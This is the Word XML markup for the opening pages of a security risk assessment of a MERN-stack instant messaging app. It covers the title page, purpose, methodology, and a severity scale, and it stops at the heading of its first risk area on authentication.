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p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="160"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="646464"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Real-Time Instant Messaging System</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2C3E50"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="240" w:after="160"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2C3E50"/>
          <w:sz w:val="56"/>
        </w:rPr>
        <w:t>Critical &amp; High-Risk Areas of the Design</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i/>
          <w:color w:val="646464"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Design Vulnerability Assessment &amp; Mitigation Recommendations</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2C3E50"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="400"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="646464"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>MERN Stack (MongoDB, Express.js, React, Node.js) + Socket.IO</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Author: IM Project Development Team</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Date: September 12, 2026</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="240"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2C3E50"/>
          <w:sz w:val="36"/>
        </w:rPr>
        <w:t>Table of Contents</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> TOC \o "1-3" \h \z \u </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="969696"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[Right-click here and select 'Update Field' to generate Table of Contents]</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Deliverable:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="20"/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> Critical Risk Analysis &amp; Design Vulnerability Assessment</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>System Under Analysis:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="20"/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> Real-Time Instant Messaging Application (MERN Stack with WebSockets)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Scope:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="20"/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> Identification, analysis, and mitigation recommendations for high-risk architectural and implementation decisions</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1. Introduction</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1.1 Purpose</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">This document identifies and formally analyzes the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>critical and high-risk areas</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> within the Instant Messaging (IM) system's architecture and implementation. The objective is to demonstrate awareness of design trade-offs, document known vulnerabilities, assess their potential impact, and propose targeted mitigation strategies.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1.2 Methodology</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Each risk area is analyzed using the following structured framework:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">1. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Identification:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Description of the vulnerable component or design decision. 2. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Evidence:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Specific code references and implementation patterns that exhibit the risk. 3. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Threat Scenario:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Concrete attack vectors or failure modes that could exploit the vulnerability. 4. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Impact Assessment:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Severity classification based on Likelihood × Impact. 5. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Current Mitigation:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Any existing safeguards already present in the codebase. 6. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Recommended Mitigation:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Proposed improvements to reduce or eliminate the risk.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1.3 Severity Classification Scale</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLayout w:type="autofit"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2340"/>
        <w:gridCol w:w="2340"/>
        <w:gridCol w:w="2340"/>
        <w:gridCol w:w="2340"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2340"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="2C3E50" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Severity</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2340"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="2C3E50" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Likelihood</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2340"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="2C3E50" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Impact</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2340"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="2C3E50" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Description</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2340"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">🔴 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Critical</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2340"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2340"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2340"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Immediate threat to data integrity or security; exploitation is straightforward</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2340"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">🟠 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2340"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium-High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2340"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2340"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Significant threat requiring active exploitation; can cause major damage</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2340"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">🟡 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2340"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2340"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2340"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Degradation of service or data quality under specific conditions</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2340"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">🟢 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2340"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2340"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Low-Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2340"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Minor inconvenience; mitigated by existing framework defaults</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2. Risk Area 1: Authentication &amp; Session Security</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
